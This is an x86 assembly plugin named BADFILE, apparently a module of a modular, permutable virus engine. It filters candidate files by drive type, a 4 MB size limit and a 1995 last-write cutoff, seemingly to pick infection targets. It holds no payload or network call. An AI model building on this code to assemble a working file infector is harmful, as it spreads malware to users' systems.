   ; BADFILE
   ; ~~~~~~~
   ; - used to determine if file may be processed
   ;   þ skip too big files;
   ;   þ skip too old files

   MAX_SIZE                equ     4*1048576         ; 4 MB

   include                 INCLUDE\consts.inc
   include                 rxio.inc
   include                 k32man.inc

   include                 plugin.inc
                           PLUGIN_START    BADFILE, CODE32, PERMUTABLE

   handleevent:            hookevent EV_BADFILE_ISBADFILE, checkbadfile
                           stc
                           retn

   ; input:  EDX=filename
   ; action: handle event if file is bad;
   ;         keep event otherwise

   checkbadfile:           pusha

                           cmp     [edx].word ptr 1, '\:'
                           jne     __skipnamecheck

                           IS_RING0        ; EAX changed
                           jz      __ring0

   __ring3:                push    edx
                           mov     eax, [edx]
                           and     eax, 00FFFFFFh
                           push    eax
                           push    esp
                           callX   GetDriveTypeA
                           pop     ecx
                           pop     edx

                           cmp     eax, DRIVE_FIXED
                           je      __gooddrive
                           cmp     eax, DRIVE_REMOTE
                           je      __gooddrive
                           cmp     eax, DRIVE_RAMDISK
                           je      __gooddrive

                           jmp     __badfile

   __ring0:
   ;                       VxDcall IFSMGR, Get_Drive_Info ; ==RETN, sucks!
   ;                       VxDcall IFSMGR, Ring0GetDriveInfo ; no drivetype info
                           nop
                           nop
   __gooddrive:

   __skipnamecheck:

                           sub     esp, size ff_struc
                           mov     edi, esp
                           event   EV_rx_findfirst
                           jc      __badfile       ; not found
                           xchg    ebx, eax
                           event   EV_rx_findclose

                           ; now, EDX=filename, EDI=ff_struc

                           mov     eax, [edi].ff_time_lastwrite.dword ptr 4
                           cmp     eax, 01B9B8E9h  ; 1-1-1995  xx:xx:xx
                           jb      __badfile   ; too old

                           mov     eax, [edi].ff_size
                           cmp     eax, MAX_SIZE
                           ja      __badfile   ; too big

   __exit:                 add     esp, size ff_struc
                           popa
                           stc     ; keep event, normal file
                           retn

   __badfile:              add     esp, size ff_struc
                           popa
                           clc     ; event handled: bad file
                           retn

                           PLUGIN_END
